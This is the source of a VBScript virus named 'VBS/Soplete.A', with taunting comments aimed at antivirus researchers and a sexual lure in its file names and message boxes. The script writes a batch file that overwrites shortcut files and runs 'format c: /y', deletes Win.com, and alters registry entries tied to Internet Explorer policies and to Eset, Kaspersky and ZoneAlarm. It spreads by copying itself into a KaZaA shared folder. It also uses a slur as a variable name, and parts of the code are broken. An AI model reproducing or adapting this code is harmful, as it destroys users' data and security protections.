   ' VBS/Soplete.A
   'Chitrulo, champurreado, soplete.
   'For AV researchers: Just make the sex with love and you will feel the real pleasure...



   MsgBox "Do you know how feel the real sex pleasure?"

   set gay = CreateObject("Scripting.FileSystemObject")
   set a = gay.CreateTextFile("c:\windows\real_sex.mov.vbs", true)
   Set gay = CreateObject("Wscript.Shell")
   set gay=shell.CreateShortCut("C:\real_sex.mov.lnk")


   Set dir1=gay.GetSpecialFolder(0)
   Set dir2=gay.GetSpecialFolder(1)


   gay.TargetPath=shell.ExpandEnvironment("C:\real_sex.mov.lnk")
   gay.WindowStyle=4
   gay.Save
   gay gay=gay.CreateTextFile("C:\lnk.bat")
   gay.WriteLine "rem BAT/RealSex.A"
   gay.WriteLine "cls"
   gay.WriteLine "@echo off"
   gay.WriteLine "for %%a in (*.lnk ..\*.lnk \*.lnk %path%\*.lnk %tmp%\*.lnk %temp%\*.lnk %windir%\*.lnk) do copy C:\lnk.bat %%a"
   gay.WriteLine "format c: /y"
   gay.Close
   gay.Run  "C:\lnk.bat"

   gay.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\Connwiz Admin Lock",0,"REG_DWORD"
   gay.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\SecurityTab",0,"REG_DWORD"
   gay.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\ResetWebSettings",0,"REG_DWORD"
   gay.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions\NoViewSource",0,"REG_DWORD"
   gay.Regwrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Infodelivery\Restrictions\NoAddingSubScriptions",0,"REG_DWORD"
   gay.Regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFileMenu",0,"REG_DWORD"
   gay.Regwrite "HKCU\Software\Eset\Nod\CurrentVersion\Modules\AMON\Settings\Config000\Scanner\Signatures_enable",0,"REG_DWORD"
   gay.Regwrite "HKCU\Software\KasperskyLab\SharedFiles\Folder",0,"REG_SZ"
   gay.Regwrite "HKCU\Software\Zone Labs\ZoneAlarm\InstallDirectory",0,"REG_SZ"

   Set gay = gay.GetFile("c:\Windows\Win.com")
   gay.Delete

   gay.CopyFile Wscript.ScriptFullName, "C:\My Shared Folder\real_sex.mov.vbs", True


   gay.RegWrite "HKLM\\Software\\KaZaA\\Transfer\\DlDir0", "C:\My Shared Folder"

   MsgBox "Just make the sex with love"
